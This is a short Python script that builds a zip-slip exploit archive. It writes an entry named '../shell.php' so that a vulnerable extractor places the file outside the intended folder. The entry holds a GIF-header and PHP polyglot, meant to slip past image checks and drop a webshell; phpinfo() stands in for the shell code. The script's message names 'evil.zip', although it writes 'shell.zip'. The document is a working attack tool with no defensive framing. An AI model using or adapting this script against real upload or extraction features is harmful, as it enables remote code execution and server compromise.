import zipfile
import os

payload_name = "../shell.php" 
payload_content = 'GIF89a;<?php phpinfo(); ?>'  

with zipfile.ZipFile("shell.zip", "w") as zipf:
    zipf.writestr(payload_name, payload_content)

print("[+] Created payload zip: evil.zip")